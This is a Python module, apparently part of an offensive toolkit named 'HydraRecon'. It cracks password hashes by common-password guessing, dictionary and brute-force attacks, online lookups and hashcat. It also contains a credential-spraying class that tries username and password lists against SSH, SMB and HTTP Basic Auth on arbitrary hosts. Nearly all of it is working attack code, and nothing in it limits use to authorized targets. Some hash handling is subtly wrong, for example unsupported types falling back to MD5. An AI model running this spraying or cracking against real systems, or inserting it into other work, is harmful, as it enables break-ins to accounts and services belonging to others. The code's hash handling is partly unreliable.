#!/usr/bin/env python3
"""
HydraRecon Hash Cracker Module
████████████████████████████████████████████████████████████████████████████████
█  ADVANCED HASH CRACKING ENGINE - Rainbow Tables, Dictionary, Brute Force     █
████████████████████████████████████████████████████████████████████████████████
"""

import asyncio
import hashlib
import re
import os
import subprocess
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple
from enum import Enum


class HashType(Enum):
    MD5 = ("md5", 32, r'^[a-f0-9]{32}$')
    SHA1 = ("sha1", 40, r'^[a-f0-9]{40}$')
    SHA256 = ("sha256", 64, r'^[a-f0-9]{64}$')
    SHA512 = ("sha512", 128, r'^[a-f0-9]{128}$')
    NTLM = ("ntlm", 32, r'^[a-f0-9]{32}$')
    LM = ("lm", 32, r'^[a-f0-9]{32}$')
    MYSQL = ("mysql", 40, r'^\*[A-F0-9]{40}$')
    POSTGRES_MD5 = ("postgres_md5", 35, r'^md5[a-f0-9]{32}$')
    BCRYPT = ("bcrypt", None, r'^\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}$')
    SHA512_CRYPT = ("sha512_crypt", None, r'^\$6\$[./A-Za-z0-9]+\$[./A-Za-z0-9]{86}$')
    MD5_CRYPT = ("md5_crypt", None, r'^\$1\$[./A-Za-z0-9]+\$[./A-Za-z0-9]{22}$')
    UNKNOWN = ("unknown", None, None)
    
    def __init__(self, hash_name: str, length: Optional[int], pattern: Optional[str]):
        self.hash_name = hash_name
        self.length = length
        self.pattern = pattern


@dataclass
class HashInfo:
    """Hash information"""
    original: str
    hash_type: HashType
    cracked: bool = False
    plaintext: Optional[str] = None
    confidence: float = 0.0
    crack_time: Optional[float] = None
    method: str = ""


@dataclass
class CrackResult:
    """Hash cracking result"""
    hash_value: str
    plaintext: str
    hash_type: HashType
    method: str
    time_taken: float


class HashIdentifier:
    """
    Identifies hash types from hash strings
    """
    
    def identify(self, hash_string: str) -> List[Tuple[HashType, float]]:
        """
        Identify possible hash types with confidence scores
        Returns list of (HashType, confidence) tuples sorted by confidence
        """
        hash_string = hash_string.strip().lower()
        results = []
        
        for hash_type in HashType:
            if hash_type == HashType.UNKNOWN:
                continue
            
            confidence = self._check_hash(hash_string, hash_type)
            if confidence > 0:
                results.append((hash_type, confidence))
        
        # Sort by confidence
        results.sort(key=lambda x: x[1], reverse=True)
        
        if not results:
            results.append((HashType.UNKNOWN, 0.0))
        
        return results
    
    def _check_hash(self, hash_string: str, hash_type: HashType) -> float:
        """Check if hash matches type and return confidence"""
        if hash_type.pattern:
            if re.match(hash_type.pattern, hash_string, re.IGNORECASE):
                # High confidence for pattern match
                confidence = 0.8
                
                # Increase confidence for exact length match
                if hash_type.length and len(hash_string) == hash_type.length:
                    confidence = 0.9
                
                return confidence
        
        # Length-based check for simple hashes
        if hash_type.length and len(hash_string) == hash_type.length:
            if re.match(r'^[a-f0-9]+$', hash_string):
                return 0.5
        
        return 0.0
    
    def detect_all(self, hashes: List[str]) -> Dict[str, List[Tuple[HashType, float]]]:
        """Detect hash types for multiple hashes"""
        results = {}
        for h in hashes:
            results[h] = self.identify(h)
        return results


class HashCracker:
    """
    Advanced hash cracking engine
    Supports dictionary attacks, brute force, and online lookups
    """
    
    # Common password patterns
    COMMON_PASSWORDS = [
        "password", "123456", "12345678", "password1", "qwerty",
        "admin", "root", "letmein", "welcome", "monkey", "dragon",
        "master", "login", "passw0rd", "abc123", "111111", "123123",
        "1234567890", "password123", "admin123", "root123", "test",
        "guest", "administrator", "changeme", "P@ssw0rd", "p@ssword",
    ]
    
    # Common suffixes to try
    SUFFIXES = ["", "1", "12", "123", "1234", "!", "@", "#", "2023", "2024"]
    
    # Character sets for brute force
    CHARSETS = {
        "lowercase": "abcdefghijklmnopqrstuvwxyz",
        "uppercase": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "digits": "0123456789",
        "special": "!@#$%^&*()_+-=[]{}|;:,.<>?",
        "alpha": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "alphanumeric": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "all": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?",
    }
    
    # Online lookup APIs (free tier)
    ONLINE_APIS = {
        "nitrxgen": "https://ntlm.pw/api/lookup/{hash}",
        "hashes.org": "https://hashes.org/api.php?act=search&hash={hash}",
    }
    
    def __init__(self, wordlist_path: Optional[str] = None):
        self.identifier = HashIdentifier()
        self.wordlist_path = wordlist_path
        self.cracked_hashes: Dict[str, str] = {}
        self.hashcat_path = self._find_hashcat()
        self.john_path = self._find_john()
    
    def _find_hashcat(self) -> Optional[str]:
        """Find hashcat binary"""
        paths = ["/usr/bin/hashcat", "/usr/local/bin/hashcat", "/opt/hashcat/hashcat"]
        for path in paths:
            if os.path.exists(path):
                return path
        return None
    
    def _find_john(self) -> Optional[str]:
        """Find John the Ripper binary"""
        paths = ["/usr/bin/john", "/usr/local/bin/john", "/opt/john/run/john"]
        for path in paths:
            if os.path.exists(path):
                return path
        return None
    
    def _hash_string(self, plaintext: str, hash_type: HashType) -> str:
        """Generate hash of plaintext"""
        if hash_type == HashType.MD5:
            return hashlib.md5(plaintext.encode()).hexdigest()
        elif hash_type == HashType.SHA1:
            return hashlib.sha1(plaintext.encode()).hexdigest()
        elif hash_type == HashType.SHA256:
            return hashlib.sha256(plaintext.encode()).hexdigest()
        elif hash_type == HashType.SHA512:
            return hashlib.sha512(plaintext.encode()).hexdigest()
        elif hash_type == HashType.NTLM:
            # NTLM hash (MD4 of UTF-16LE encoded password)
            import binascii
            try:
                # Use passlib if available
                from passlib.hash import nthash
                return nthash.hash(plaintext)
            except ImportError:
                # Fallback - simplified NTLM
                return hashlib.new('md4', plaintext.encode('utf-16le')).hexdigest()
        else:
            return hashlib.md5(plaintext.encode()).hexdigest()
    
    def quick_crack(self, hash_value: str, hash_type: HashType = None) -> Optional[CrackResult]:
        """
        Quick crack attempt using common passwords
        """
        start_time = datetime.now()
        hash_value = hash_value.lower().strip()
        
        # Identify hash type if not provided
        if hash_type is None:
            identified = self.identifier.identify(hash_value)
            if identified:
                hash_type = identified[0][0]
        
        if hash_type == HashType.UNKNOWN:
            return None
        
        # Check cache
        if hash_value in self.cracked_hashes:
            elapsed = (datetime.now() - start_time).total_seconds()
            return CrackResult(hash_value, self.cracked_hashes[hash_value], 
                             hash_type, "cache", elapsed)
        
        # Try common passwords
        for password in self.COMMON_PASSWORDS:
            for suffix in self.SUFFIXES:
                candidate = password + suffix
                
                # Also try with case variations
                for variation in [candidate, candidate.upper(), candidate.capitalize()]:
                    test_hash = self._hash_string(variation, hash_type)
                    
                    if test_hash == hash_value:
                        elapsed = (datetime.now() - start_time).total_seconds()
                        self.cracked_hashes[hash_value] = variation
                        return CrackResult(hash_value, variation, hash_type, 
                                         "common_password", elapsed)
        
        return None
    
    async def dictionary_attack(self, hash_value: str, wordlist_path: str,
                               hash_type: HashType = None,
                               progress_callback=None) -> Optional[CrackResult]:
        """
        Dictionary attack using wordlist file
        """
        start_time = datetime.now()
        hash_value = hash_value.lower().strip()
        
        # Identify hash type if not provided
        if hash_type is None:
            identified = self.identifier.identify(hash_value)
            if identified:
                hash_type = identified[0][0]
        
        if not os.path.exists(wordlist_path):
            return None
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                total_lines = sum(1 for _ in f)
                f.seek(0)
                
                for i, line in enumerate(f):
                    word = line.strip()
                    if not word:
                        continue
                    
                    test_hash = self._hash_string(word, hash_type)
                    
                    if test_hash == hash_value:
                        elapsed = (datetime.now() - start_time).total_seconds()
                        self.cracked_hashes[hash_value] = word
                        return CrackResult(hash_value, word, hash_type,
                                         "dictionary", elapsed)
                    
                    # Progress callback
                    if progress_callback and i % 10000 == 0:
                        progress = (i / total_lines) * 100
                        await progress_callback(progress, word)
        
        except Exception as e:
            print(f"Dictionary attack error: {e}")
        
        return None
    
    async def brute_force(self, hash_value: str, hash_type: HashType,
                         charset: str = "alphanumeric",
                         min_length: int = 1, max_length: int = 6,
                         progress_callback=None) -> Optional[CrackResult]:
        """
        Brute force attack with character set
        """
        start_time = datetime.now()
        hash_value = hash_value.lower().strip()
        
        chars = self.CHARSETS.get(charset, self.CHARSETS["alphanumeric"])
        
        def generate_candidates(length: int):
            """Generate all combinations of given length"""
            if length == 1:
                for c in chars:
                    yield c
            else:
                for c in chars:
                    for rest in generate_candidates(length - 1):
                        yield c + rest
        
        attempts = 0
        for length in range(min_length, max_length + 1):
            for candidate in generate_candidates(length):
                attempts += 1
                
                test_hash = self._hash_string(candidate, hash_type)
                
                if test_hash == hash_value:
                    elapsed = (datetime.now() - start_time).total_seconds()
                    self.cracked_hashes[hash_value] = candidate
                    return CrackResult(hash_value, candidate, hash_type,
                                     "brute_force", elapsed)
                
                # Progress callback every 100k attempts
                if progress_callback and attempts % 100000 == 0:
                    await progress_callback(attempts, candidate)
        
        return None
    
    async def online_lookup(self, hash_value: str) -> Optional[CrackResult]:
        """
        Look up hash in online databases
        """
        import aiohttp
        
        start_time = datetime.now()
        hash_value = hash_value.strip()
        
        try:
            async with aiohttp.ClientSession() as session:
                # Try hashes.org
                url = f"https://hashes.org/api.php?act=search&hash={hash_value}"
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if data.get("found"):
                            plaintext = data.get("result")
                            elapsed = (datetime.now() - start_time).total_seconds()
                            
                            identified = self.identifier.identify(hash_value)
                            hash_type = identified[0][0] if identified else HashType.UNKNOWN
                            
                            self.cracked_hashes[hash_value] = plaintext
                            return CrackResult(hash_value, plaintext, hash_type,
                                             "online_lookup", elapsed)
        except Exception:
            pass
        
        return None
    
    async def crack_with_hashcat(self, hash_value: str, hash_type: HashType,
                                wordlist_path: str) -> Optional[CrackResult]:
        """
        Crack hash using hashcat
        """
        if not self.hashcat_path:
            return None
        
        # Hashcat mode mapping
        mode_map = {
            HashType.MD5: "0",
            HashType.SHA1: "100",
            HashType.SHA256: "1400",
            HashType.SHA512: "1700",
            HashType.NTLM: "1000",
            HashType.BCRYPT: "3200",
        }
        
        mode = mode_map.get(hash_type)
        if not mode:
            return None
        
        start_time = datetime.now()
        
        try:
            # Create temp hash file
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write(hash_value)
                hash_file = f.name
            
            # Run hashcat
            cmd = [
                self.hashcat_path,
                "-m", mode,
                "-a", "0",  # Dictionary attack
                hash_file,
                wordlist_path,
                "--quiet",
                "--potfile-disable",
                "-o", hash_file + ".out"
            ]
            
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await proc.communicate()
            
            # Check output
            out_file = hash_file + ".out"
            if os.path.exists(out_file):
                with open(out_file, 'r') as f:
                    result = f.read().strip()
                    if ':' in result:
                        plaintext = result.split(':')[-1]
                        elapsed = (datetime.now() - start_time).total_seconds()
                        return CrackResult(hash_value, plaintext, hash_type,
                                         "hashcat", elapsed)
            
            # Cleanup
            os.unlink(hash_file)
            if os.path.exists(out_file):
                os.unlink(out_file)
        
        except Exception as e:
            print(f"Hashcat error: {e}")
        
        return None
    
    def analyze_hash(self, hash_value: str) -> HashInfo:
        """
        Analyze a hash and return detailed info
        """
        hash_value = hash_value.strip()
        identified = self.identifier.identify(hash_value)
        
        hash_type = identified[0][0] if identified else HashType.UNKNOWN
        confidence = identified[0][1] if identified else 0.0
        
        info = HashInfo(
            original=hash_value,
            hash_type=hash_type,
            confidence=confidence
        )
        
        # Try quick crack
        result = self.quick_crack(hash_value, hash_type)
        if result:
            info.cracked = True
            info.plaintext = result.plaintext
            info.crack_time = result.time_taken
            info.method = result.method
        
        return info
    
    def batch_analyze(self, hashes: List[str]) -> List[HashInfo]:
        """Analyze multiple hashes"""
        return [self.analyze_hash(h) for h in hashes]


class CredentialSprayer:
    """
    Credential spraying attack module
    Tests credentials across multiple services/hosts
    """
    
    def __init__(self, config=None):
        self.config = config
        self.results = []
        self.active = False
    
    async def spray_ssh(self, hosts: List[str], usernames: List[str],
                       passwords: List[str], port: int = 22,
                       progress_callback=None) -> List[Dict]:
        """
        Spray credentials against SSH
        """
        results = []
        total = len(hosts) * len(usernames) * len(passwords)
        current = 0
        
        try:
            import asyncssh
            
            for host in hosts:
                for username in usernames:
                    for password in passwords:
                        current += 1
                        
                        if progress_callback:
                            await progress_callback(
                                (current / total) * 100,
                                f"{username}@{host}"
                            )
                        
                        try:
                            async with asyncssh.connect(
                                host, port=port,
                                username=username, password=password,
                                known_hosts=None,
                                connect_timeout=5
                            ) as conn:
                                results.append({
                                    "host": host,
                                    "port": port,
                                    "service": "ssh",
                                    "username": username,
                                    "password": password,
                                    "valid": True,
                                    "timestamp": datetime.now().isoformat()
                                })
                        except Exception:
                            pass
                        
                        # Rate limiting
                        await asyncio.sleep(0.1)
        
        except ImportError:
            pass
        
        return results
    
    async def spray_smb(self, hosts: List[str], usernames: List[str],
                       passwords: List[str], domain: str = "",
                       progress_callback=None) -> List[Dict]:
        """
        Spray credentials against SMB/Windows
        """
        results = []
        total = len(hosts) * len(usernames) * len(passwords)
        current = 0
        
        try:
            from impacket.smbconnection import SMBConnection
            
            for host in hosts:
                for username in usernames:
                    for password in passwords:
                        current += 1
                        
                        if progress_callback:
                            await progress_callback(
                                (current / total) * 100,
                                f"{domain}\\{username}@{host}"
                            )
                        
                        try:
                            smb = SMBConnection(host, host)
                            smb.login(username, password, domain)
                            smb.close()
                            
                            results.append({
                                "host": host,
                                "port": 445,
                                "service": "smb",
                                "domain": domain,
                                "username": username,
                                "password": password,
                                "valid": True,
                                "timestamp": datetime.now().isoformat()
                            })
                        except Exception:
                            pass
                        
                        await asyncio.sleep(0.1)
        
        except ImportError:
            pass
        
        return results
    
    async def spray_http_basic(self, urls: List[str], usernames: List[str],
                              passwords: List[str],
                              progress_callback=None) -> List[Dict]:
        """
        Spray credentials against HTTP Basic Auth
        """
        import aiohttp
        
        results = []
        total = len(urls) * len(usernames) * len(passwords)
        current = 0
        
        async with aiohttp.ClientSession() as session:
            for url in urls:
                for username in usernames:
                    for password in passwords:
                        current += 1
                        
                        if progress_callback:
                            await progress_callback(
                                (current / total) * 100,
                                f"{username}@{url}"
                            )
                        
                        try:
                            auth = aiohttp.BasicAuth(username, password)
                            async with session.get(
                                url, auth=auth,
                                timeout=aiohttp.ClientTimeout(total=5),
                                ssl=False
                            ) as resp:
                                if resp.status != 401:
                                    results.append({
                                        "url": url,
                                        "service": "http_basic",
                                        "username": username,
                                        "password": password,
                                        "status_code": resp.status,
                                        "valid": True,
                                        "timestamp": datetime.now().isoformat()
                                    })
                        except Exception:
                            pass
                        
                        await asyncio.sleep(0.05)
        
        return results


# Convenience functions
def identify_hash(hash_string: str) -> List[Tuple[HashType, float]]:
    """Quick hash identification"""
    return HashIdentifier().identify(hash_string)


def quick_crack_hash(hash_string: str) -> Optional[str]:
    """Quick crack attempt"""
    cracker = HashCracker()
    result = cracker.quick_crack(hash_string)
    return result.plaintext if result else None
